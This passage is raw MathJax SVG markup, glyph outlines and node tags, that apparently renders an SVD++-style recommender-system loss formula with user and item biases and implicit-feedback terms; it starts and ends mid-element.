653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1037.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2093.6, 0)"><g data-mml-node="mo" transform="translate(479.7, 0)"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(0, -1147.3) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(961, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1239, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(1584, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(1973, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(2640, 0)"><g data-mml-node="mi"><path data-c="1D445" d="M230 637Q203 637 198 638T193 649Q193 676 204 682Q206 683 378 683Q550 682 564 680Q620 672 658 652T712 606T733 563T739 529Q739 484 710 445T643 385T576 351T538 338L545 333Q612 295 612 223Q612 212 607 162T602 80V71Q602 53 603 43T614 25T640 16Q668 16 686 38T712 85Q717 99 720 102T735 105Q755 105 755 93Q755 75 731 36Q693 -21 641 -21H632Q571 -21 531 4T487 82Q487 109 502 166T517 239Q517 290 474 313Q459 320 449 321T378 323H309L277 193Q244 61 244 59Q244 55 245 54T252 50T269 48T302 46H333Q339 38 339 37T336 19Q332 6 326 0H311Q275 2 180 2Q146 2 117 2T71 2T50 1Q33 1 33 10Q33 12 36 24Q41 43 46 45Q50 46 61 46H67Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628Q287 635 230 637ZM630 554Q630 586 609 608T523 636Q521 636 500 636T462 637H440Q393 637 386 627Q385 624 352 494T319 361Q319 360 388 360Q466 361 492 367Q556 377 592 426Q608 449 619 486T630 554Z"></path></g></g></g></g><g data-mml-node="mo" transform="translate(4497, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(4886, 0)"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="TeXAtom" transform="translate(529, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(572, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(850, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g><g data-mml-node="mo" transform="translate(6532.2, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(7532.4, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(8326.7, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(9326.9, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(10432.6, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msub" transform="translate(11432.8, 0)"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(429, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(12378, 0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msubsup" transform="translate(13378.2, 0)"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485, 413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z"></path></g><g data-mml-node="mi" transform="translate(485, -247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(14633.2, 0)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"></path></g><g data-mml-node="mo" transform="translate(15355.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(15744.4, 0)"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(572, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(16993.1, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mo" transform="translate(17993.4, 0)"><path data-c="6D" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q351 442 364 440T387 434T406 426T421 417T432 406T441 395T448 384T452 374T455 366L457 361L460 365Q463 369 466 373T475 384T488 397T503 410T523 422T546 432T572 439T603 442Q729 442 740 329Q741 322 741 190V104Q741 66 743 59T754 49Q775 46 803 46H819V0H811L788 1Q764 2 737 2T699 3Q596 3 587 0H579V46H595Q656 46 656 62Q657 64 657 200Q656 335 655 343Q649 371 635 385T611 402T585 404Q540 404 506 370Q479 343 472 315T464 232V168V108Q464 78 465 68T468 55T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z"></path><path data-c="69" d="M69 609Q69 637 87 653T131 669Q154 667 171 652T188 609Q188 579 171 564T129 549Q104 549 87 564T69 609ZM247 0Q232 3 143 3Q132 3 106 3T56 1L34 0H26V46H42Q70 46 91 49Q100 53 102 60T104 102V205V293Q104 345 102 359T88 378Q74 385 41 385H30V408Q30 431 32 431L42 432Q52 433 70 434T106 436Q123 437 142 438T171 441T182 442H185V62Q190 52 197 50T232 46H255V0H247Z" transform="translate(833, 0)"></path><path data-c="6E" d="M41 46H55Q94 46 102 60V68Q102 77 102 91T102 122T103 161T103 203Q103 234 103 269T102 328V351Q99 370 88 376T43 385H25V408Q25 431 27 431L37 432Q47 433 65 434T102 436Q119 437 138 438T167 441T178 442H181V402Q181 364 182 364T187 369T199 384T218 402T247 421T285 437Q305 442 336 442Q450 438 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z" transform="translate(1111, 0)"></path></g><g data-mml-node="msub" transform="translate(19827, 0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="msup" transform="translate(20999.3, 0)"><g data-mml-node="mo"><path data-c="2223" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="TeXAtom" transform="translate(278, 413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(778, 0)"><g data-mml-node="mn" transform="translate(220, 394) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220, -345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g></g></g><g data-mml-node="munder" transform="translate(22716.3, 0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(24.3, -1100) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g><g data-mml-node="mo" transform="translate(412, 0)"><path data-c="2208" d="M84 250Q84 372 166 450T360 539Q361 539 377 539T419 540T469 540H568Q583 532 583 520Q583 511 570 501L466 500Q355 499 329 494Q280 482 242 458T183 409T147 354T129 306T124 272V270H568Q583 262 583 250T568 230H124V228Q124 207 134 177T167 112T231 48T328 7Q355 1 466 0H570Q583 -10 583 -20Q583 -32 568 -40H471Q464 -40 446 -40T417 -41Q262 -41 172 45Q84 127 84 250Z"></path></g><g data-mml-node="msub" transform="translate(1079, 0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(440, -150) scale(0.707)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g><g data-mml-node="msub" transform="translate(24327, 0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(490, -150) scale(0.707)"><path data-c="1D457" d="M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z"></path></g></g><g data-mml-node="mo" transform="translate(25158.3, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="msup" transform="translate(25547.3, 0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 